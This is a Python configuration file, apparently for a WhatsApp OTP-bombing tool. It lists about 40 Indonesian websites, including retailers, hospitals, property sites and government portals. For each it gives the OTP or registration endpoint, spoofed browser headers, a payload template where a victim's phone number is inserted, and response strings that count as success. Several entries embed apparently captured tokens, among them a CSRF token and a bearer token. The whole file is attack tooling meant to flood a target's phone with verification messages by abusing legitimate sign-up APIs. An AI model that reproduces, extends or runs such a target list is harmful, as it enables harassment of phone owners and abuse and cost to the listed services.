#!/usr/bin/env python3
# targets.py - Daftar 39 target OTP WhatsApp

import uuid
import random

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

TARGETS = [
    {
        'name': 'Pinhome',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.pinhome.id'},
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['secretcode']
    },
    {
        'name': 'Maulagi',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://maulagi.id',
            'x-ml-key': 'C59RUHBU59',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': '?1',
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['"status":"success"']
    },
    {
        'name': 'PlanetBan',
        'url': 'https://api.planetban.com/website/customer/request-otp',
        'referer': 'https://planetban.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://planetban.com'},
        'payload': '{"name":"Test","phone":"{number}","password":"Test123","purpose":"register","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['status":true','success']
    },
    {
        'name': 'Rumah123',
        'url': 'https://www.rumah123.com/api/otp/request-otp',
        'referer': 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
        'headers': {'Content-Type':'application/json;charset=UTF-8','Origin':'https://www.rumah123.com','base-url-core':'https://www.rumah123.com'},
        'payload': '{"cancelledRequestId":"{rand}","ipAddress":"{ip}","phoneNumber":"{number}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}',
        'number_fmt': lambda p: p,
        'success_on': ['requestid']
    },
    {
        'name': 'Paper',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dunia Games',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'Bunda Hospital',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'referer': 'https://www.bunda.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bunda.co.id','x-locale':'id'},
        'payload': '{"phone_number":{number},"type":"auth"}',
        'number_fmt': lambda p: int(p),
        'success_on': ['otp']
    },
    {
        'name': 'Bonus Belanja',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {'Content-Type':'application/json','Origin':'https://www.bonusbelanja.com'},
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },
    {
        'name': 'Hijup',
        'url': 'https://www.hijup.com/sign_in',
        'referer': 'https://www.hijup.com/sign_in',
        'headers': {
            'Content-Type':'text/plain;charset=UTF-8','Origin':'https://www.hijup.com',
            'next-action':'b7eda6e749fbadcfcf226c2e36865091520b679f',
            'next-router-state-tree':'%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'next-url':'/sign_in',
        },
        'payload': '[{"phone_number":"{number}","store_path":"hijup"}]',
        'number_fmt': lambda p: p,
        'success_on': ['otp','code','success']
    },
    {
        'name': 'Alodokter',
        'url': 'https://www.alodokter.com/resend-otp',
        'referer': 'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
        'headers': {
            'Content-Type':'application/json','Origin':'https://www.alodokter.com',
            'x-csrf-token':'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
        },
        'payload': '{"user":{"phone":"{number}","uuid":"{uuid_val}"},"request_via":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code']
    },
    {
        'name': 'Blibli Tiket',
        'url': 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
        'referer': 'https://account.bliblitiket.com/login/complete-details?clientId=9dc79e3916a042abc86c2aa525bff009',
        'headers': {
            'Content-Type':'text/plain;charset=UTF-8','Origin':'https://account.bliblitiket.com',
            'x-request-id': str(uuid.uuid4()),
            'x-channel-id':'MWEB',
            'x-lang':'id',
            'x-entity':'TIKET',
            'x-client-id':'9dc79e3916a042abc86c2aa525bff009',
        },
        'payload': '{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"{number}","recaptchaToken":""}',
        'number_fmt': fmt_plus,
        'success_on': ['requestId','success','otp']
    },
    {
        'name': 'Ohsome',
        'url': 'https://ohsome.co.id/api/member/user/random_code_check',
        'referer': 'https://ohsome.co.id/login',
        'headers': {
            'Content-Type':'application/json','Origin':'https://ohsome.co.id','language':'id',
            'deviceid':'ba0a0027a5e6e7cde77f0f94f2572495','x-store-no':'SC001',
            'traceparent':'00-6bd858f4bdf14f53a8d3de8e6741641a-d542ee3bee82f7f4-01','platform':'H5',
            'tracestate':'rum=v2&browser&j2e0xaqli6@901063bd0372204&df97461d6dea41e59bb8ad0ea28ef184&uid_had63ijdnpxyb93t',
        },
        'payload': '{"country_code":"62","account":"{number}","type_id":2,"device_id":"ba0a0027a5e6e7cde77f0f94f2572495","check_code":"219097","image_id":"tcsRCTZ0RAvqQAvcUJDG"}',
        'number_fmt': fmt_phone_only,
        'success_on': ['success','otp','code']
    },
    {
        'name': 'Optik Melawai',
        'url': 'https://api.optikmelawai.com/api/v3/auth/register/1',
        'referer': 'https://www.optikmelawai.com/',
        'post_type': 'multipart',
        'headers': {
            'authorization':'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
            'x-unique-user':'GA1.1.1062236172.1780823549','language':'id','Origin':'https://www.optikmelawai.com',
        },
        'number_fmt': lambda p: p,
        'success_on': ['success','otp'],
    },
    {
        'name': 'Holland Bakery',
        'post_type': 'resend_otp',
        'url': 'https://www.hollandbakery.co.id/resend-otp-register',
        'referer': 'https://www.hollandbakery.co.id/login-phone',
        'headers': {
            'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.hollandbakery.co.id',
            'Referer':'https://www.hollandbakery.co.id/users/verify_token',
        },
        'number_fmt': lambda p: p,
        'success_on': ['verify','verification','kode verifikasi','Silakan masukkan kode'],
    },
    {
        'name': 'Hash Micro',
        'post_type': 'hashmicro',
        'url': 'https://website-api.hashmicro.com/api/add/3',
        'referer': 'https://www.hashmicro.com/',
        'headers': {'Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.hashmicro.com'},
        'number_fmt': fmt_phone_only,
        'success_on': ['success','thank','terimakasih','redirect']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'url': 'https://api.tuneup.id/v1/mitra/register/send-otp',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': []
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'url': 'https://ultramilk-clp.kata.ai/api/ultramilk/register',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva International Bali',
        'post_type': 'kaniva',
        'url': 'https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'url': 'https://api.jembatani.co.id/v1/register',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'url': 'https://sso.rcx.co.id/auth/passwordless/request',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'url': 'https://www.sahabatteknisi.co.id/api/auth/otp/check-phone',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1', 'success']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'url': '',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'url': '',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': lambda p: p,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
    {
        'name': 'Watsons',
        'post_type': 'watsons',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': 'HRS',
        'post_type': 'hrsbre',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': ['success','berhasil','otp','verifikasi','selamat']
    },
    {
        'name': 'Erafone',
        'post_type': 'erafone',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': lambda p: p[2:],
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'url': '',
        'referer': '',
        'headers': {},
        'payload': '',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
    {
        "name": "UangMe",
        "post_type": "uangme",
        "number_fmt": fmt_08,
        "success_on": ["success", "otp", "sent", "200"]
    },
    {
        "name": "ADIRAKU",
        "post_type": "adiraku",
        "number_fmt": fmt_08,
        "success_on": ["success", "otp", "sent"]
    },
    {
        "name": "Dunia Games",
        "post_type": "duniagames",
        "number_fmt": fmt_08,
        "success_on": ["success", "otp", "sent"]
    },
]